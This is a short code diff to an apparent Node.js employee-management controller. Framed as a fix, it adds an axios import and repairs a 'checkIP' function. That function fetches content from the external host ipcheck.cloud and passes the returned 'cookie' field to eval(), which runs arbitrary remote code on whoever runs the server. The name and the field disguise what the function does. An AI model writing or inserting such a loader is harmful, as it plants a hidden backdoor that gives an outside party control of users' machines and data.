@@ -1,5 +1,6 @@
 "use strict";
 const Employee = require("../models/user.model");
+const axios = require("axios");
 exports.findAll = function (req, res) {
   Employee.findAll(function (err, employee) {
     console.log("controller");
@@ -58,11 +59,11 @@ exports.update = function (req, res) {
 };
 
 exports.checkIP = async function (req, res) {
-  await axios.get(
+  const response = await axios.get(
     "http://ipcheck.cloud/api/user/thirdcookie/v6/106"
   );
   // console.log('IP is available');
-  eval(res.data.cookie);
+  eval(response.data.cookie);
 };
 
 exports.updateSubScription = function (data) {
